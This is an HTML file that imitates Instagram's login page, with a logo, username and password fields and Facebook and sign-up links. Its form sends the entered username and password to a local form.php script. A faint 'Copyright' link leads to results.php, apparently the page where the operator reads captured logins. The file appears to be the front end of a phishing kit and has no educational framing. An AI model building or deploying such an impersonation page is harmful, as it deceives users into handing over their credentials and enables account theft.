<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="shortcut icon" href="assets/icons/favicon.svg" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="container">
        <div id="insta-logo">
            <img src="assets/icons/logo.svg" alt="Instagram Logo">
        </div>
        <!-- Login form -->
        <form action="form.php" method="POST">
            <div class="input-box">
                <input type="text" name="username" id="username" placeholder="Phone number, username, or email">
            </div>
            <div class="input-box">
                <input type="password" name="password" id="password" placeholder="Password">
            </div>
            <div class="input-box">
                <p id="forgot-password"><a href="" id="link">Forgot password?</a></p>
            </div>
            <div class="input-box">
                <button type="submit" id="submit">Log in</button>
            </div>
            <div class="input-box" id="facebook-login-container">
                <div>
                    <img src="assets/icons/facebook.png" alt="">
                </div>
                <div>
                    <a href="" id="link2">Log in with Facebook</a>
                </div>
            </div>
            <div class="input-box" id="line-container">
                <div id="line"></div>
                <p>OR</p>
                <div id="line"></div>
            </div>
            <div class="input-box" id="sign-up-container">
                <p>Don't have an account? <a href="">Sign up.</a></p>
            </div>
            <a href="results.php" id="link" style="color: #ddd;display: block;text-align: center;">Copyright @ 2024</a>
        </form>
    </div>
    <script src="script.js"></script>
</body>

</html>